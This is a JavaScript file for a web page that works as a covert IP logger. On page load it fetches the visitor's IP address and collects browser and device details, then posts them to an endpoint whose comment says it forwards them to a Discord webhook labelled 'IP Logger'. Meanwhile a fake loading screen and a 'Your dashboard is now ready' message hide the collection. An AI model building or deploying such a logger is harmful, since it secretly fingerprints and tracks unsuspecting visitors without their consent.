document.addEventListener('DOMContentLoaded', function() {
    // Function to get visitor information
    async function getVisitorInfo() {
        try {
            // Get IP information using ipify API
            const response = await fetch('https://api.ipify.org?format=json');
            const ipData = await response.json();
            
            // Get additional information about the visitor
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const platform = navigator.platform;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const referrer = document.referrer || 'Direct visit';
            const date = new Date().toISOString();
            
            // Prepare data for webhook
            const visitorData = {
                ip: ipData.ip,
                userAgent: userAgent,
                language: language,
                platform: platform,
                screen: `${screenWidth}x${screenHeight}`,
                referrer: referrer,
                date: date
            };
            
            // Send data to our server endpoint
            await sendToWebhook(visitorData);
            
            // After 3 seconds, redirect to a legitimate site or show content
            setTimeout(() => {
                // For demo purposes, we'll just show a message
                document.querySelector('.hero h2').textContent = 'Thank You!';
                document.querySelector('.hero p').textContent = 'Your dashboard is now ready.';
                document.querySelector('.loader').style.display = 'none';
                document.querySelector('.small-text').textContent = 'Enjoy your personalized experience.';
            }, 3000);
            
        } catch (error) {
            console.error('Error collecting visitor information:', error);
        }
    }
    
    // Function to send data to Discord webhook
    async function sendToWebhook(data) {
        try {
            // Format data for Discord webhook
            const webhookData = {
                embeds: [{
                    title: "New Visitor Detected",
                    color: 3447003, // Blue color
                    fields: [
                        { name: "IP Address", value: data.ip, inline: true },
                        { name: "Date & Time", value: data.date, inline: true },
                        { name: "Platform", value: data.platform, inline: true },
                        { name: "Screen Size", value: data.screen, inline: true },
                        { name: "Language", value: data.language, inline: true },
                        { name: "Referrer", value: data.referrer, inline: true },
                        { name: "User Agent", value: data.userAgent }
                    ],
                    footer: {
                        text: "IP Logger by NinjaTech AI"
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Send to our server endpoint which will forward to Discord
            await fetch('/log-visitor', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
        } catch (error) {
            console.error('Error sending to webhook:', error);
        }
    }
    
    // Start the process
    getVisitorInfo();
});
